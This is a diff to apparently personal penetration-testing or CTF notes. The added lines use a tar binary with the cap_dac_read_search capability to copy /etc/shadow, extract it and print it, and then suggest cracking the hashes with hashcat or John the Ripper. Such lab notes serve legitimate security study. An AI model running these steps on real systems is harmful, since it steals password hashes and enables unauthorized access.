@@ -20,6 +20,8 @@ Fuzzing
 
 Check GTFO Bins
 
+Can crack shadow with John The Ripper / Hashcat
+
 ---
 \[NMAP RESULTS]:  
 PORT   STATE SERVICE VERSION
@@ -127,6 +129,10 @@ getcap -r / 2>/dev/null
 
 #/bin/tar = cap_dac_read_search+ep - cap_dac_read_search+ep - can read any file
 /bin/tar -cf /tmp/shadow.tar /etc/shadow
+cd /tmp
+/bin/tar -xf shadow.tar
+cat etc/shadow
+# Now can crack /etc/shadow w/ hashcat/jtr
 
 
 
